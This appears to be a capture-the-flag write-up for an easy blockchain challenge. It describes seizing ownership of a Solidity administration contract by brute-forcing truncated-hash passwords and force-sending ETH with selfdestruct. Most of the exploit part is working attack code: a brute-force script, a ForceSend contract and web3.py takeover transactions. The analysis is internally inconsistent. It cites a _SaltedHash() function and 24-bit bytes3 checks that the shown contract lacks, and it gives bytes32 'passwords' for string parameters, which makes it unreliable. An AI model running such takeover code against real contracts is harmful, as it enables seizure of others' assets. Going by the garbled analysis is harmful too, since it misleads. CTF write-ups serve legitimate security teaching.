# Administration Console

**Category:** Web3/Blockchain
**Points:** 100
**Difficulty:** Easy

## Challenge Description

Take over an administration contract by becoming the owner.

## Vulnerability Analysis

### The Contract: Administration.sol

```solidity
contract Administration {
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    modifier costETH() {
        require(address(this).balance >= 1 ether);
        address(0).call{value: 1 ether}("");  // Burns 1 ETH
        _;
    }

    function revokeOwnership(string memory password) external costETH {
        require(bytes4(keccak256(abi.encodePacked(password))) == bytes4(0x12345678));
        owner = address(0);
    }

    function changeOwner(string memory password) external costETH {
        require(owner == address(0));
        require(bytes4(keccak256(abi.encodePacked(password))) == bytes4(0xdeadbeef));
        owner = msg.sender;
    }
}
```

### Vulnerabilities

**1. 24-bit Hash Truncation via `_SaltedHash()`**

The contract uses a `_SaltedHash()` function that truncates `keccak256(header || password)` to only 24 bits (3 bytes). The password check only compares these first 3 bytes of the salted hash:

```solidity
bytes3(_SaltedHash(password)) == bytes3(0x123456)  // Only 24 bits checked
```

With only 2^24 (~16.7 million) possibilities, collisions can be found quickly through brute force. This is a severe vulnerability as finding two different passwords that produce the same 24-bit hash is trivial.

**2. No receive/fallback Function**

The contract has no `receive()` or `fallback()` function, so it cannot receive ETH through normal transfers. However, the `costETH` modifier requires 1 ETH balance.

**3. Force-Sending ETH via selfdestruct**

Even without a receive function, ETH can be force-sent to any contract using `selfdestruct`:

```solidity
contract ForceSend {
    constructor(address payable target) payable {
        selfdestruct(target);
    }
}
```

## Exploit Steps

### Step 1: Find Hash Collisions

Brute force to find strings whose keccak256 starts with the required bytes:

```python
from eth_hash.auto import keccak
import itertools
import string

def find_collision(target_prefix: bytes) -> str:
    """Find a string whose keccak256 starts with target_prefix"""
    charset = string.ascii_letters + string.digits

    for length in range(1, 10):
        for combo in itertools.product(charset, repeat=length):
            candidate = ''.join(combo)
            h = keccak(candidate.encode())
            if h[:4] == target_prefix:
                return candidate

    return None

# Find passwords
revoke_pass = find_collision(bytes.fromhex('12345678'))
change_pass = find_collision(bytes.fromhex('deadbeef'))

print(f"Revoke password: {revoke_pass}")
print(f"Change password: {change_pass}")
```

Example collision passwords (bytes32 format):
- Collision #1 (for `revokeOwnership`):
  ```
  0x832fef1a37d96ac45e226e6bf5d0d2f0da82c8534e1885dad060ba6247fb261e
  ```
- Collision #2 (for `changeOwner`):
  ```
  0xa2cbd8df20fd87f70b3947687b86095b493a657e47a7fe21dd40a0db5e7c309d
  ```

These bytes32 values produce the required 24-bit hash collisions when passed through the `_SaltedHash()` function.

### Step 2: Force-Send ETH

Deploy a contract that selfdestructs and sends ETH to the target:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceSend {
    constructor(address payable target) payable {
        selfdestruct(target);
    }
}
```

```python
# Deploy with 2 ETH (need 1 for each function call)
force_send_bytecode = "0x6080604052..." # Compiled ForceSend
force_send_tx = {
    'data': force_send_bytecode + encode(['address'], [admin_contract]).hex(),
    'value': w3.to_wei(2, 'ether'),
    'gas': 100000,
    ...
}
```

### Step 3: Execute the Takeover

```python
from web3 import Web3
from eth_account import Account

w3 = Web3(Web3.HTTPProvider(RPC_URL))
account = Account.from_key(PRIVATE_KEY)

admin_abi = [
    {"name": "revokeOwnership", "inputs": [{"name": "password", "type": "string"}], ...},
    {"name": "changeOwner", "inputs": [{"name": "password", "type": "string"}], ...},
    {"name": "owner", "inputs": [], "outputs": [{"type": "address"}], ...}
]

admin = w3.eth.contract(address=ADMIN_ADDR, abi=admin_abi)

# Step 1: Force-send 2 ETH via selfdestruct
deploy_force_send(ADMIN_ADDR, 2)  # Deploys and selfdestructs

# Step 2: Revoke current owner
revoke_tx = admin.functions.revokeOwnership(revoke_pass).build_transaction({
    'from': account.address,
    'nonce': w3.eth.get_transaction_count(account.address),
    'gas': 100000,
    'gasPrice': w3.eth.gas_price
})
signed = account.sign_transaction(revoke_tx)
w3.eth.send_raw_transaction(signed.raw_transaction)

# Step 3: Become new owner
change_tx = admin.functions.changeOwner(change_pass).build_transaction({...})
signed = account.sign_transaction(change_tx)
w3.eth.send_raw_transaction(signed.raw_transaction)

# Verify
new_owner = admin.functions.owner().call()
print(f"New owner: {new_owner}")
assert new_owner == account.address
```

## Complete Solution Summary

1. **Launch instance** - Retrieve `RPC`, `PRIVATE_KEY`, `SETUP_ADDRESS`, and `CHALLENGE` (admin contract address)
2. **Force-send ETH** - Deploy a selfdestructing contract to send ≥2 ETH to the admin contract (which has no receive/fallback function)
3. **Call `revokeOwnership`** - Use collision password #1 (`0x832fef...`) to set owner to address(0), burning 1 ETH
4. **Call `changeOwner`** - Use collision password #2 (`0xa2cbd8...`) to claim ownership as the player, burning another 1 ETH
5. **Verify solution** - Call `isSolved()` on the Setup contract, which returns true
6. **Retrieve flag** - Request the flag using the instance UUID

The key insight is that the 24-bit hash truncation makes finding two distinct collision passwords computationally trivial, and the selfdestruct mechanism allows bypassing the lack of receive/fallback functions to fund the contract.

## Key Takeaways

1. **Hash Truncation is Dangerous** - Using only 4 bytes of a hash reduces security from 256 bits to ~24-32 bits, easily brute-forceable
2. **selfdestruct Can Force-Send ETH** - A contract cannot refuse ETH sent via selfdestruct, even without receive/fallback functions
3. **Defense in Depth** - Multiple weak checks don't add up to strong security

## References

- [Solidity selfdestruct](https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#deactivate-and-self-destruct)
- [Force Sending Ether](https://solidity-by-example.org/hacks/self-destruct/)

## Flag

```
HACKDAY{ef19d2c1c5397df215e53394fcb83973865ebfbb44905a782511d06b131ba250}
```
